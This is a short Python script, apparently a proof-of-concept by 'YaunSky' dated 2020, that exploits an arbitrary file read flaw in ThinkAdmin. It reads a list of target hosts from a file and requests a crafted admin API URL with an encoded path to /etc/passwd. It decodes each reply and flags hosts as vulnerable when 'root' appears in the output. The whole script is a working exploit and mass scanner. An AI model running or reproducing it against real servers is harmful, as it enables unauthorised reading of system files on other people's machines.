# by : YaunSky
# 时间 : 2020-12-06
# 内容 : ThinkAdmin 任意文件读取 (脚本读取/etc/passwd)


import requests
import json
import base64

requests.packages.urllib3.disable_warnings()

heard = {
    "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763",
    "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language" : "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding" : "gzip, deflate",
    "Connection" : "close",
    "Upgrade-Insecure-Requests" : "1" 
}
res = open("ip2.txt","r")                   #ip2.txt 存放探目标的文件
for ip in res.readlines():
    #print(ip.strip())
    url = ip.strip()+"/admin/login.html?s=admin/api.Update/get/encode/1a1a1b1a1a1b1a1a1b2t382r1b342p37373b2s"
    try:
        request = requests.get(url=url, headers=heard, verify=False, timeout=3)
        try:
            rep = base64.b64decode(json.loads(request.text)['data']['content'])
            if "root" in str(rep):
                print("[+]"+ip.strip()+"存在任意文件读取漏洞")
            else:
                pass
        except:
            pass
    except:
        pass